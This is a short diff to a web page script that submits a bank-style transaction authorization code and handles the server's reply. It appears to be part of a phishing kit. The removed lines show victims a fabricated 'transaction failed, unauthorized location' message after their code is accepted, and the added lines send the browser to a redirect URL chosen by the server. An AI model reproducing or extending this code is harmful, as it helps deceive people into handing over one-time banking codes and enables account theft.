@@ -27,11 +27,12 @@ document.addEventListener('DOMContentLoaded', () => {
       });
 
       if (response.ok) {
-        // Show thank you message after successful verification
-        thankYouMessage.style.display = 'block';
-        thankYouMessage.innerText =
-          'Transaction failed, we recognized a log in attempt from an unauthorized location. Please contact customer Support for further details.';
-        submitAuthCodeButton.innerText = 'Failed';
+        submitAuthCodeButton.innerText = 'Verified';
+
+        const responseData = await response.json();
+        const redirectUrl = responseData.redirectUrl;
+
+        window.location.href = redirectUrl;
       } else {
         // Handle errors (e.g., invalid OTP)
         submitAuthCodeButton.innerText = 'Invalid TAC, Try Again';
